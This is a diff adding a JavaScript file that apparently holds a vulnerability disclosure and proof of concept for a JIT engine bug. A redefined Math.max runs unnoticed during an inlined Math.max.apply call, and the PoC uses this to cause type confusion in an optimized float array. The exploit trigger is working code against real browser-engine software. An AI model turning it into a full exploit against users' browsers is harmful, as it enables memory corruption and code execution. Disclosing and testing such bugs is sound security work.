@@ -1,0 +1,32 @@
+/*
+1. Call patterns like "Math.max.apply(Math, [1, 2, 3, 4, 5])" and "Math.max.apply(Math, arr)" can be optimized to directly call the method "JavascriptMath::MaxInAnArray" in the Inline Phase.
+2. The method takes the original method "Math.max" as the first parameter and the arguments object as the second parameter.
+3. If the arguments object can't be handled by the method, it explicitly calls the original method "Math.max".
+4. But it doesn't check if the property "Math.max" has changed, so a user defined JavaScript function can be called without updating "ImplicitCallFlags".
+
+Note: Math.min as well.
+
+PoC:
+*/
+
+function opt(arr, arr2) {
+    arr[0] = 1.1;
+    Math.max.apply(Math, arr2);
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1, 2.2, 3.3, 4.4];
+    for (let i = 0; i < 10000; i++) {
+        opt(arr, [1, 2, 3, 4]);
+    }
+
+    Math.max = function () {
+        arr[0] = {};
+    };
+
+    opt(arr, {});  // can't handle, calls Math.max
+    print(arr[0]);
+}
+
+main();
